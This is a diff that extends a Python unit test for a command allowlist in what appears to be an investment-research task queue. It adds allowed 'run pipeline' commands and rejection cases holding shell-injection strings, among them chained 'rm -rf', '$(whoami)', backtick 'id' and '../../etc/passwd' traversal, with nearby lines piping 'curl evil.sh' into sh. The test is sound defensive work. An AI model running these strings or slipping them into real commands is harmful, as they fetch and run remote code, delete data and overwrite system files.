@@ -518,6 +518,7 @@ class TestQueueAllowlist(unittest.TestCase):
         for cmd in ("run radar", "run digest", "run themes", "run chain SIG-20260829-01",
                     "run heat ai-infrastructure", "run scenarios ai-infrastructure",
                     "run screen ai-infrastructure", "run screen ai-infrastructure S2",
+                    "run profile VRT", "run pipeline VRT", "run pipeline HPS-A.TO",
                     "run deepdive VRT ai-infrastructure",
                     "run redteam HPS-A.TO ai-infrastructure",
                     "refresh data/chains/ai-infrastructure.json",
@@ -531,6 +532,11 @@ class TestQueueAllowlist(unittest.TestCase):
                     "run chain SIG-20260829-01 || curl evil.sh | sh",
                     "run screen ai-infrastructure $(whoami)",
                     "run screen ai-infrastructure `id`",
+                    "run pipeline VRT && echo pwned",
+                    "run pipeline VRT; rm -rf data/pipelines",
+                    "run pipeline $(whoami)", "run pipeline `id`",
+                    "run pipeline VRT ai-infrastructure",
+                    "run pipeline ../../etc/passwd",
                     "run digest > /etc/passwd"):
             self.assertFalse(self.allowed(cmd), f"injection accepted: {cmd}")
 
